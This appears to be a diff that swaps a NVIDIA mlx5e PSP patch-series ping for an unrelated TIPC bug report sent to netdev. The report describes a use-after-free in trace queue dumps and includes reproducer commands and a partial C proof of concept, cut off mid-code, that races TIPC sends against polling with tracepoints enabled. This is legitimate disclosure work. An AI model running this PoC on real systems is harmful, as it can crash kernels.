@@ -1,195 +1,331 @@
-Received: from SN4PR2101CU001.outbound.protection.outlook.com (mail-southcentralusazon11012048.outbound.protection.outlook.com [40.93.195.48])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-pf1-f171.google.com (mail-pf1-f171.google.com [209.85.210.171])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 1BE5C39185E;
-	Mon, 20 Jul 2026 06:05:30 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=fail smtp.client-ip=40.93.195.48
-ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1784527536; cv=fail; b=Mnr0ny5V9YImLCWIeWqv2CRK37yFk8CDaZXhayEc5QYCbbsZlFK7Id2UPk4IwCtzQ8j2eZ29KcXRzS9/8ThFt9cG4Q8+AI8d9GFiE3XGT1P7PKz76Z2ENcLB+4I/TJDKDbQHqbUZAKjDWkHLgEUdNWKCLX1R5Mfd1dQLhbd6MoI=
-ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1784527536; c=relaxed/simple;
-	bh=+DZEC4mna4alxZr0m+V8MOKQggJDijjgGPF2Z1SEuXg=;
-	h=Message-ID:Date:Subject:To:Cc:References:From:In-Reply-To:
-	 Content-Type:MIME-Version; b=Y6TG+Uoq00VWhLLZqu4XiLeAOTGAvVmyLp99NqziG995DAy2dZSfCmY/8UkVu2m8i92MBjXtWyB19/5DA7wRx0KXBCkaayVXBIMNG81JocOs7pZsmehpkcXZ5t+UEHy108RIrK5FN797U2cCXYNGmG2LFI0JfOgUUO73DwvUBEs=
-ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=nvidia.com; spf=fail smtp.mailfrom=nvidia.com; dkim=pass (2048-bit key) header.d=Nvidia.com header.i=@Nvidia.com header.b=eKanYhhw; arc=fail smtp.client-ip=40.93.195.48
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=nvidia.com
-Authentication-Results: smtp.subspace.kernel.org; spf=fail smtp.mailfrom=nvidia.com
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 906C539022A
+	for <netdev@vger.kernel.org>; Mon, 20 Jul 2026 06:45:26 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.171
+ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1784529928; cv=none; b=Bpxam1NhqimGwjXtcaUvk2VEYnRxQ0npkbKcHR1xWM/RO0C+YXWmiel+zGjUmxqSLzvSrQEJvF+9kFPlC0VD8eWnsBeBEAIIq4/bro1aJsvjYpnV76JGQULQk6GoSyCBEZAXa/9twrX40kLqt/wBAYRYoBZNzbeme+yqH7V4rN4=
+ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1784529928; c=relaxed/simple;
+	bh=LdrZURZF54ZVeCDURwfouKZy77Cou9RehwlIG50Nm/M=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=MIbQo7sx328QXhxR11B1KLc2nxvahs6oZDZiRbDjVmcDndSmEueiHEwejvt5bSUJMAOUd2V0Nrldy6gB0y5e7bONa0qFc1QT0CW9FRAXXFeqD5/MyiWGIj/gQk2SJj0PFfaVsddPylQBK6RLAeFGy+WojcaEMataCBvHYpY12Ns=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=eS+dnMfY; arc=none smtp.client-ip=209.85.210.171
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=Nvidia.com header.i=@Nvidia.com header.b="eKanYhhw"
-ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
- b=lmF4J54DXINCOpjTsCXKvRTE7xoFaQFMDlFiF1rrnODz6RNgQEmd587AnUtoKQXZywj3EptXcwHdnJnBjQE+OOfgPlG7chUFxjzcUdLnMjV/Qu0sRmKYLXnI0ISl3PZpN7fidccIQkUNZTywPvYpNnl5H/gU7a7NHG4yq3N2EoRBox6FHpj4C3VWaE4yvYEWNivhNJWYLyCHeCwrRrg0vOirY0BgBPssAhkg6pe3/r5w4X0yiF/g1YNDfhKRT5oAITSob63YS2HFR2U4IHGvKZDwnW3ZUe+yWvunLNPjREhmSFVH0kEBqi2EBsFZSdNWfUnpo2ZlQLLVOMYkAsjmZw==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
- s=arcselector10001;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
- bh=iU/r5inKaf9CeOiTRYZ8LEWdSXMxhKGeUzgws2oKu8w=;
- b=GQp7xiC8wg7FLVMMeuzaeNTJ2rmLLL0+J2r3Cm+HD+EW6zfz50zG0Q6AdvvBZ24Z6FtB0qvePlqo747YYYVNQSJ+CZeKnRGAZ++kfDbSyOf9Ul12SJ/Jduib6PZfSTFynWlL76wisgfQJvh5iW8Ket5cn53znjmIJK0TzFgAX491RcjWS1yHgQ1MZXotg+eihYS8R199uzrSoPIA4cynZE0X0vM5BZ6GALCfXiadHl0QJFTO4aoFjO/PQrnh31sQ04EVbZcAD6gh2Db5czdPS51ZU1Q5oi5a+Y8Jn0/McDn/oBXsr63COUwemk7fp8YI+GZSVBBGHq40XbQKzgqG6g==
-ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
- smtp.mailfrom=nvidia.com; dmarc=pass action=none header.from=nvidia.com;
- dkim=pass header.d=nvidia.com; arc=none
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=Nvidia.com;
- s=selector2;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
- bh=iU/r5inKaf9CeOiTRYZ8LEWdSXMxhKGeUzgws2oKu8w=;
- b=eKanYhhwtiF8hK3zy1kb5AORnpJoFtUQa53xeOYsaGkVhCJZ31Nq9M2rxDHfrjPeE9y8EZzV+hyJ8ypUCfQD5YBwtk6MT8bjipuS4+xg6z5sh2vHCWE9URcpaQyI+h+9f5J54cEQz52zLR+M4qlbtoz6L3z+cKXY+st2uJ3KQB3X9xlaUZF8aY1GmjpLHDjR8s7ROy5orsDeJ5r1i1hC4/KVliYqCRHyjzWgwpu2fgP8GfKvh3S4kqebu0H3PRlXPGqSa0Pzxi19CLP1gfRvyA2TMLOsQg300dZUz8vKVm25JrheNKBZ4qGtQ6/JHg5IBRfugvbU96eufSpm2Qng5Q==
-Authentication-Results: dkim=none (message not signed)
- header.d=none;dmarc=none action=none header.from=nvidia.com;
-Received: from MW6PR12MB7086.namprd12.prod.outlook.com (2603:10b6:303:238::20)
- by MW6PR12MB7071.namprd12.prod.outlook.com (2603:10b6:303:238::8) with
- Microsoft SMTP Server (version=TLS1_2,
- cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.21.223.12; Mon, 20 Jul
- 2026 06:05:22 +0000
-Received: from MW6PR12MB7086.namprd12.prod.outlook.com
- ([fe80::4eb8:7fcb:fe8d:e95e]) by MW6PR12MB7086.namprd12.prod.outlook.com
- ([fe80::4eb8:7fcb:fe8d:e95e%6]) with mapi id 15.21.0223.017; Mon, 20 Jul 2026
- 06:05:21 +0000
-Message-ID: <d7d7949e-746b-4e54-aa97-04e63544a98d@nvidia.com>
-Date: Mon, 20 Jul 2026 09:05:17 +0300
-User-Agent: Mozilla Thunderbird
-Subject: Re: [PATCH net-next 00/15] net/mlx5e: PSP cleanups and improvements
-To: Tariq Toukan <tariqt@nvidia.com>, Andrew Lunn <andrew+netdev@lunn.ch>,
- "David S. Miller" <davem@davemloft.net>, Eric Dumazet <edumazet@google.com>,
- Jakub Kicinski <kuba@kernel.org>, netdev@vger.kernel.org,
- Paolo Abeni <pabeni@redhat.com>
-Cc: Aleksandr Loktionov <aleksandr.loktionov@intel.com>,
- Boris Pismenny <borisp@nvidia.com>, Chris Mi <cmi@nvidia.com>,
- Cosmin Ratiu <cratiu@nvidia.com>, Daniel Zahka <daniel.zahka@gmail.com>,
- Dragos Tatulea <dtatulea@nvidia.com>, Gal Pressman <gal@nvidia.com>,
- Jacob Keller <jacob.e.keller@intel.com>, Jianbo Liu <jianbol@nvidia.com>,
- Lama Kayal <lkayal@nvidia.com>, Leon Romanovsky <leon@kernel.org>,
- linux-kernel@vger.kernel.org, linux-rdma@vger.kernel.org,
- Mark Bloch <mbloch@nvidia.com>, Raed Salem <raeds@nvidia.com>,
- Rahul Rameshbabu <rrameshbabu@nvidia.com>, Saeed Mahameed
- <saeedm@nvidia.com>, Stanislav Fomichev <sdf@fomichev.me>,
- Stanislav Fomichev <sdf.kernel@gmail.com>,
- Willem de Bruijn <willemdebruijn.kernel@gmail.com>
-References: <20260707130858.969928-1-tariqt@nvidia.com>
-Content-Language: en-US
-From: Tariq Toukan <tariqt@nvidia.com>
-In-Reply-To: <20260707130858.969928-1-tariqt@nvidia.com>
-Content-Type: text/plain; charset=UTF-8; format=flowed
-Content-Transfer-Encoding: 7bit
-X-ClientProxiedBy: FR4P281CA0423.DEUP281.PROD.OUTLOOK.COM
- (2603:10a6:d10:d1::13) To MW6PR12MB7086.namprd12.prod.outlook.com
- (2603:10b6:303:238::20)
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="eS+dnMfY"
+Received: by mail-pf1-f171.google.com with SMTP id d2e1a72fcca58-84847482584so2585203b3a.0
+        for <netdev@vger.kernel.org>; Sun, 19 Jul 2026 23:45:26 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20251104; t=1784529926; x=1785134726; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=ZXqfumNRpx2Tnw9Ffd/2p+8RUaPSIhQOSqeFaCXzboI=;
+        b=eS+dnMfYk4K65dWWE8SLhh/hTFQlZiSGRoot50DeT9CagKSqJ7O2MUw8vJJNIJWR9w
+         DWPLyFLiTYbEkXe57ubmRFYfsECi/t3+ZZrflz1IOdNi4wNKv7iSDXfoar4G+6W7/6GF
+         JzfO0XGgwAFm30/ew7OWEg7sUYZ/t8yvesFFT3kgIb2WBeu0eVkrbaJP58mhaQH5ZYWS
+         Nl+oE9+1q7YDv3DWOX96cx/wvEutNdVvVGYHbPY8AbXgMRAvRm01WFR/lpgUhvEopr55
+         1UieVEhRM+VjV2F9wJUTIvZ88ic+EhmY02DlUUEpcFYEYc5gHkXudTeYQn3t9YVQpx1Y
+         1cfA==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1784529926; x=1785134726;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=ZXqfumNRpx2Tnw9Ffd/2p+8RUaPSIhQOSqeFaCXzboI=;
+        b=a9tSwIAJ7UUsxSEFD8aTcItWuEc0iHnN7KW+PIkwfqjZ0AdFEhfbBfQci40gKPIQwQ
+         4feX0W4DQYaxyeGvCs26S1M7D59vk99AvRl2+EcBksdWmEpIKhcQFWJcl4I2vJTg9Hxj
+         AL91Q7gpAHIhypQ6/vQeipUqhgUdOBAf/37ujpBBMDQ+ERKqkXhDy3O/iSELaP6NFLus
+         1bLf1TLBRQIGnSCNOJJgN2I49H8ilP10OVTCNEmdp9tVDhPJAu7gAx997Kb6IA6bNEGF
+         MFD4QPIaxGZxl7NNYyTij/wlRZ5wvQ8Zlbug02rO00HEmhZ3vwqDCVQ3ghkLRDvHsoCP
+         SDEQ==
+X-Gm-Message-State: AOJu0Yx4oBka3Bi+qXg3sSjdjgvc8JZ+KzOvsfyHx9PNnuopahCzqGQK
+	ekppjurJ4tjLyDvk/1TGxMeiKx/aQDoRRJFDFUfLt3EfA+u1y34F9s+G0C68BPLjyGA=
+X-Gm-Gg: AfdE7cm9i7/NvA/stAufTCkGm0T9PYTQPjOh+7UDLK3djGc721f+OUTeLMj75XNBr0W
+	Q8InjRMxITjUxdPWgSW0+iNSsLUomXlx8Twc7MDLczjsS5CQ8dap5VqYdSvrgx2iHOMVueftQTq
+	yQA++aRQPcS8jGdwHdgYcLhABFX/XrD3dPy+vcz+x2hX59gJ3pRv5I8avvlVM8zDBjlkCK8gdbm
+	koSw9kQWWeD84oQYf0jutaCHAbYqPiwu12RicrXqXpWBFpz783SafVr0E/30tjACofpmUKI/P5P
+	8vcNaXKIxM0eHkOIWC1014LgRhqoQREGIPz7TyIZEO2pRxH+muDcg9M8s+7Ln0gy6/PX9Nf0xCU
+	EMpt112t/87F9CLvPc4lpuMZbnmKQjFngrUeV0zWmPMPQA3uZGsXusDK/CroHYmB7MCpbt4uMaD
+	bmpMNyvKIQ7PcAAjRPWA==
+X-Received: by 2002:a05:6a00:b85:b0:848:452d:9a14 with SMTP id d2e1a72fcca58-84beb18b131mr16510149b3a.16.1784529925694;
+        Sun, 19 Jul 2026 23:45:25 -0700 (PDT)
+Received: from enjou-Legion-Y7000P-2019 ([144.48.80.242])
+        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-84c2af30c89sm5102834b3a.36.2026.07.19.23.45.20
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Sun, 19 Jul 2026 23:45:25 -0700 (PDT)
+From: Ren Wei <enjou1224z@gmail.com>
+To: netdev@vger.kernel.org,
+	tipc-discussion@lists.sourceforge.net
+Cc: jmaloy@redhat.com,
+	davem@davemloft.net,
+	edumazet@google.com,
+	pabeni@redhat.com,
+	horms@kernel.org,
+	ying.xue@windriver.com,
+	tuong.t.lien@dektech.com.au,
+	vega@nebusec.ai,
+	xizh2024@lzu.edu.cn,
+	enjou1224z@gmail.com
+Subject: [PATCH net 0/1] tipc: avoid UAF in trace queue dumps
+Date: Mon, 20 Jul 2026 14:45:17 +0800
+Message-ID: <cover.1784443039.git.xizh2024@lzu.edu.cn>
+X-Mailer: git-send-email 2.51.0
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-X-MS-PublicTrafficType: Email
-X-MS-TrafficTypeDiagnostic: MW6PR12MB7086:EE_|MW6PR12MB7071:EE_
-X-MS-Office365-Filtering-Correlation-Id: 0d3465a2-da2a-4c3d-f2e0-08dee624e1ca
-X-MS-Exchange-SenderADCheck: 1
-X-MS-Exchange-AntiSpam-Relay: 0
-X-Microsoft-Antispam:
-	BCL:0;ARA:13230040|1800799024|366016|23010399003|376014|7416014|6133799003|10067099003|18002099003|56012099006|11063799006|22082099003;
-X-Microsoft-Antispam-Message-Info:
-	ZszCl9h/KbhMe7enJFt7c0UbtSzqnuCRg0RHhXYVIUyNqAIoQYqwzU+gyz6dKreho9sqBNETE/egWNy53a0rExsIIAIFbRgicrKqmNWStB0tGIe5WVYhuyEUw1xhY805at3rA+8ZAUWYiFDfegZT9rdXK2y39WgEdbksrUxFsA30JsOpmDfn15wbRgxyG2i8Z591CmmJGxfiXdTGaLUOU7cE3n6di8nB2/rQlj7qWhbNdKkJmN7qdHviGlf4LcJqHEXxY2zpq/mNNC4CfdabBMNI86LvsSgNvT0VDy9bV/hdWaU/cDzXGcg009X8/VuUUFFkrxux2Ko8+2nEQtW4ddDFcjAzNEhYFfivEUE9TJbQRA+ioPuK61QR2SOTu6Sbjvj0XAW2b21uYpYOoQtDCodSqjYgSraifuRfZjKcCvp+Zvy3oV8+VABfVS2jyGnmhJ/n+FOX+nn/qR31f/3VjTydxjt5Ep4gEkSWupenyXtRbJ5+5kcmVJ8+Pgp0Bzw8NO1xPzVzw5/B7VETgh4IXrl6W8Z2vfEVj6lU8X6qA9n2UxdylI7l6iFEqcYClBI9Sxr82agt2zYS2cBTPcBtpyUyzlZoqHbEIFXZKoFlb/MV2EWWof5XOh4qip47/lvPhYZ7yvL0djKMpl3q1LvauB+KBLTJBGuFv7xmhl7sWQU=
-X-Forefront-Antispam-Report:
-	CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:MW6PR12MB7086.namprd12.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(1800799024)(366016)(23010399003)(376014)(7416014)(6133799003)(10067099003)(18002099003)(56012099006)(11063799006)(22082099003);DIR:OUT;SFP:1101;
-X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
-X-MS-Exchange-AntiSpam-MessageData-0:
-	=?utf-8?B?Qy9Fd1pNajZpZk5xNHZ5RitMeTJjWDZmeTVNSSttM0Vqb0xoNjlzU3NGNU9m?=
- =?utf-8?B?TmZNbnNpdDZLdnNkVEFsd0s3bng1Y0tCczNCeExGM1hZWUI4cnRUY2Vnd1Ux?=
- =?utf-8?B?c0ZyYzBpbWl3WEVlYmw5MXh3bWRSdnFNT0M1ZlNKZHNwMmljaUIvMVU3eXh2?=
- =?utf-8?B?R1FkV3JheTVQR3UxdWtsMW1qSUhrNkZpdEZ5aHZCdHdIZmF6VGp2d29DK1Uw?=
- =?utf-8?B?UHUvNDNLcENvNURodGdzWVR1cG1EQlp3RlJUOXVEckFFS0NZc0JlOFZCNnh4?=
- =?utf-8?B?RnpMMktJZ3hJeDh2em1jWW1rZG5Bd3BxcnRmWDczaHRobGEvU3JtaUJNVm1E?=
- =?utf-8?B?ZmpmOGRSQUUrY0ZwbVM3M0d4Nng5VW5ZUVNTY1hNQzV2aVY4ZVYybmFMWWds?=
- =?utf-8?B?VFJZRkQvQ3BMa3NPb1Z5dzkrOGF3cEFmNEpzSklCY3ZxeTlKVEs1dE95d1k4?=
- =?utf-8?B?MjY1SkxudjZtSEdpZVRpMzFzNnF6WVl6S0N0cnJpZ0p1a3ZxZFNzZHR0SUYx?=
- =?utf-8?B?eUFjOUlsUWE1UEorZHYyVDZ0UjVvb0JlUUQyZHpLd05IazJVTXpPbU9RaHpa?=
- =?utf-8?B?NjJrc3FpTkc2c2lIb3J2OFI2YkIveVM0YW16YStjejhycTV2TDluY3FjVTda?=
- =?utf-8?B?NWErQ213WGw0Q09SdHl2L2ZRREI3dWJhQ0Rld0t3ZVVoZW1HdVVyRFA0ZjB3?=
- =?utf-8?B?TjQyQ0dVYXVQSVJpMVlLMGV0MHBuSThHSTZrN2RqeVU5VEJYU0JRVS9scVN2?=
- =?utf-8?B?MGVqNXk2QmNYMzFQenA1NE0xWE5rQmFiem1wYTVJS2cyc1dhY0tGSjNmUW5B?=
- =?utf-8?B?RXVOVjIyazV6ZjY0WG80clFDWE5sV04rd0xEZXlabGZEZVdicU9KQ1ZEOUFK?=
- =?utf-8?B?UkVhV09tZis4cEhVNytuckpwR3R2QjZQb2VmTDVlakdBSUg3Q3RnU1pVRTEv?=
- =?utf-8?B?b0JvS0dhOEdNeEluUWIyWjNLUHZzV240L2wrQ2NUbU16RGE3VTdwRUh3T0p2?=
- =?utf-8?B?WUg3SW1vbHl1TE9DZzNmcS9NVXdCUzZ0VnRkOW14dng3OEczWTZxUkRWcUNl?=
- =?utf-8?B?MFhpYXNQbGdZZEN4NjJZSE81d2xWSWNGYWR6Wmw4YTdNTnA0VFE4SWhTaFRQ?=
- =?utf-8?B?OXl0NE5nNHVMZ0RSbkJVcjIwMUtLdGVPZ0ZtNW0rdTVmY0x5MVM5WVN5UE1w?=
- =?utf-8?B?QktDay9Qc1JnTDV0ZTgvV2VuQ3BKaE9ZQTBVbk81MGFHeGJtSmlxcTRJelNE?=
- =?utf-8?B?ZXQ3NFo2VS9tQkVPRy9FSjZkZEl0aGFiRjFDM1A3cktvMWRXSGE2M25VODRJ?=
- =?utf-8?B?bjBDWmdEcHBvdEZicXZNY1ptVFJRUXA4THExSVVrR0Z0TzR5L2F5NTlCeFZX?=
- =?utf-8?B?RCtaUlU5Q1VuSldJblRVNElnamNRbUw3azA1SEVoMEJPMTNscmJNcmN4cVQ5?=
- =?utf-8?B?TjVzYnhBNGxpMjgrSnFkcmpuQUFsSWZLSFg1aWwzNFBxTDlzcU9lNGZQRXR4?=
- =?utf-8?B?ZzNsVjI5OVJRZ1V6RGF3bFpQY3Q4WHdkK2FvRVZUb2pHR3pCTEdQMHFtWjFM?=
- =?utf-8?B?eGRLUEUzeXRZYjVhNUZIbTBLSzI5eVdkaWFHdC91dHF4dlRtR0NpRGExNjMr?=
- =?utf-8?B?eVFUWmY4dVZyL3ppWkpYTElMYnc4UzltM3g0TGE2MUxqeWV5UnhqelUxcWJD?=
- =?utf-8?B?ODlOM3liYk4zWDFzb09EYU9wem5UZzZDdXlEMzZHbmhyS2h0dThWL1hndXBK?=
- =?utf-8?B?Mmh3R1V2c3J2RHQ5NDBYRGo3Z2hGdENBRVYrdUpZZ2R1UGgzcUZFRGlYVTRy?=
- =?utf-8?B?aExSYnFKSjlHQVREZE5mL05hUzUydm5IaVJKRUo3Sk94eGxqemNGZnIwVmlF?=
- =?utf-8?B?K2VCVlNxTEhucStLdFdNVTRTSWVPb0ZZelJNMmM0ZVFsczkrTGk1TW44OGI1?=
- =?utf-8?B?Q00waC9XK01JV0pIQkFqRUpSMENNUWhWZ2xhUXIxQjdlSThoQkttWVJDRFFz?=
- =?utf-8?B?dmFqbnZ6bDBqVmYwd0lSNlZTblFVSXQ0YjFnNW84VUx5eUNFdGNKK3pYVkc5?=
- =?utf-8?B?cWs0M2JVY2ZaUVlsWmNCdTJJY3NvdWkwWll1TWhSeHpQT2xIOW5RR0xZcERU?=
- =?utf-8?B?UTA1d3c1REZNUzZCbjRBZjM3dU5XdjFLdjRlR21mNnBlNnk4Y3BXczQwUjlr?=
- =?utf-8?B?a3FucmlBdlNPUkZHaDROenA1RElqRStEbjZDRnV2QkhFNDZSay93ZGZaME02?=
- =?utf-8?B?ZVJpN0p6VUszQmN5aWpnbkZnT3VmRTl2RFhjYm5jYTNMZDJ1RWlhSHEweGth?=
- =?utf-8?Q?i/Eg81xz65QYz1yLa7?=
-X-OriginatorOrg: Nvidia.com
-X-MS-Exchange-CrossTenant-Network-Message-Id: 0d3465a2-da2a-4c3d-f2e0-08dee624e1ca
-X-MS-Exchange-CrossTenant-AuthSource: MW6PR12MB7086.namprd12.prod.outlook.com
-X-MS-Exchange-CrossTenant-AuthAs: Internal
-X-MS-Exchange-CrossTenant-OriginalArrivalTime: 20 Jul 2026 06:05:21.6622
- (UTC)
-X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
-X-MS-Exchange-CrossTenant-Id: 43083d15-7273-40c1-b7db-39efd9ccc17a
-X-MS-Exchange-CrossTenant-MailboxType: HOSTED
-X-MS-Exchange-CrossTenant-UserPrincipalName: Uwbe9Ojk67fZyUpFi4YNRORI/RGYuqj4KyzjcraQ3f0Nx0pzdxiybqMKoBIM/1R9aq6chfEB6VUm7Y7G+yuD1Q==
-X-MS-Exchange-Transport-CrossTenantHeadersStamped: MW6PR12MB7071
+Content-Transfer-Encoding: 8bit
 
+From: Zihan Xi <xizh2024@lzu.edu.cn>
 
+Hi Linux kernel maintainers,
 
-On 07/07/2026 16:08, Tariq Toukan wrote:
-> Hi,
-> 
-> This series by Cosmin refactors mlx5 PSP support in preparation for
-> HW-GRO support.
-> There are almost no functionality changes in all but the last two
-> patches, which address a long-standing TODO in mlx5e_psp_set_config().
-> 
-> Regards,
-> Tariq
-> 
-> Cosmin Ratiu (15):
->    net/mlx5e: psp: Rename the saved psp_dev to 'psd'
->    net/mlx5e: psp: Remove PSP steering mutexes
->    net/mlx5e: psp: Remove unneeded ref counting for PSP steering
->    net/mlx5e: psp: Merge rx_err rule add/delete with ft create/delete
->    net/mlx5e: psp: Use helpers for steering object manipulation
->    net/mlx5e: psp: Factor out drop rule creation code
->    net/mlx5e: psp: Remove unused PSP syndrome copy action
->    net/mlx5e: psp: Rename and consolidate steering functions
->    net/mlx5e: psp: Adjust rx_check FT size and use a drop_group
->    net/mlx5e: psp: Add an RX steering table
->    net/mlx5e: psp: Use a single rx_check table
->    net/mlx5e: psp: Flatten steering structures
->    net/mlx5e: psp: Make PSP steering config dynamic
->    net/mlx5e: Return errors from profile->enable
->    net/mlx5e: psp: Report PSP dev registration errors
-> 
->   drivers/net/ethernet/mellanox/mlx5/core/en.h  |    2 +-
->   .../net/ethernet/mellanox/mlx5/core/en/fs.h   |    7 +-
->   .../mellanox/mlx5/core/en_accel/en_accel.h    |   19 +-
->   .../mellanox/mlx5/core/en_accel/psp.c         | 1007 ++++++++---------
->   .../mellanox/mlx5/core/en_accel/psp.h         |   18 +-
->   .../mellanox/mlx5/core/en_accel/psp_rxtx.c    |   13 +-
->   .../mellanox/mlx5/core/en_accel/psp_rxtx.h    |    3 +-
->   .../net/ethernet/mellanox/mlx5/core/en_main.c |   23 +-
->   .../net/ethernet/mellanox/mlx5/core/en_rep.c  |    8 +-
->   9 files changed, 516 insertions(+), 584 deletions(-)
-> 
-> 
-> base-commit: 31816fc5d9acf8cdf226cdd0dc296e8cf15cc033
+We found and validated a bug in net/tipc/trace.c and net/tipc/socket.c.
+The bug is reachable by a local process that can create TIPC sockets and
+enable TIPC tracepoints. We've tested the fix with the reproducer below,
+and it should not affect any other functionality.
 
-Hi,
-It's been in-flight (still marked New) for ~2 weeks, and is blocking our 
-queue...
+This series contains one patch:
+  1/1 tipc: stop socket trace dumps from dereferencing live skb queues
 
-I don't see it tracked in Suie anymore...
-All comments in the thread were answered, no changes required for now.
+We provide bug details, reproducer steps, and a crash log below.
 
-How do we progress with this series?
+---- details below ----
+
+Bug details:
+
+tipc_sk_dump() is used by TIPC socket tracepoints, including the poll trace
+path. With TIPC_DUMP_ALL it asks tipc_list_dump() to print the socket write
+and receive queues, and it also prints the socket backlog head and tail by
+passing sk->sk_backlog.head/tail directly to tipc_skb_dump().
+
+These are live socket queues. The trace helper does not have a reliable skb
+lifetime guarantee for every queue member it inspects: TIPC socket queues are
+serialized by socket or other outer locks, and not all lists use the embedded
+sk_buff_head lock as the mutator lock. A concurrent dequeue/free can
+therefore leave the trace helper dereferencing a stale skb pointer.
+
+The patch keeps the tracepoint ABI and buffer sizing intact, but makes the
+socket trace dump report only the write queue, receive queue, and backlog
+lengths. This removes the unsafe skb dereferences from the trace path.
+
+Reproducer:
+
+Guest:
+    gcc -O2 -pthread -Wall /root/tipc_poc.c -o /root/tipc_poc
+    mount -t tracefs nodev /sys/kernel/tracing 2>/dev/null || true
+    tipc node set identity 1.1.1
+    timeout 30s /root/tipc_poc
+
+Host:
+    make O=/var/cache/linux-patch/tipc-list-dump-build-ext4 -j$(nproc) bzImage
+
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+
+------BEGIN poc.c------
+#define _GNU_SOURCE
+#include <arpa/inet.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <linux/tipc.h>
+#include <poll.h>
+#include <pthread.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+#define TRACE "/sys/kernel/tracing"
+#define TIPC_TYPE 5555
+
+static volatile int stop_flag;
+static int srv_fd, cli_fd;
+
+static void write_file(const char *path, const char *s)
+{
+    int fd = open(path, O_WRONLY | O_TRUNC);
+    if (fd < 0) { perror(path); exit(1); }
+    if (write(fd, s, strlen(s)) < 0) { perror("write"); exit(1); }
+    close(fd);
+}
+
+static void enable_trace(void)
+{
+    char path[256];
+    write_file(TRACE "/tracing_on", "0\n");
+    write_file(TRACE "/trace", "");
+    const char *evs[] = {"tipc_sk_poll", "tipc_sk_filter_rcv", "tipc_sk_overlimit1", "tipc_sk_overlimit2"};
+    for (int i = 0; i < 4; i++) {
+        snprintf(path, sizeof(path), TRACE "/events/tipc/%s/enable", evs[i]);
+        write_file(path, "1\n");
+    }
+    write_file(TRACE "/tracing_on", "1\n");
+}
+
+static void *sender(void *arg)
+{
+    char payload[4096];
+    long cnt = 0;
+    memset(payload, 'A', sizeof(payload));
+    struct sockaddr_tipc dst = {0};
+    dst.family = AF_TIPC;
+    dst.addrtype = TIPC_SERVICE_ADDR;
+    dst.scope = TIPC_CLUSTER_SCOPE;
+    dst.addr.name.name.type = TIPC_TYPE;
+    dst.addr.name.name.instance = 1;
+    dst.addr.name.domain = 0;
+    while (!stop_flag) {
+        if (sendto(cli_fd, payload, sizeof(payload), 0, (struct sockaddr *)&dst, sizeof(dst)) >= 0)
+            cnt++;
+    }
+    printf("sent %ld\n", cnt);
+    return NULL;
+}
+
+static void *poller(void *arg)
+{
+    struct pollfd pfd = {.fd = srv_fd, .events = POLLIN};
+    long cnt = 0;
+    while (!stop_flag) {
+        poll(&pfd, 1, 0);
+        cnt++;
+    }
+    printf("poll %ld\n", cnt);
+    return NULL;
+}
+
+static void *receiver(void *arg)
+{
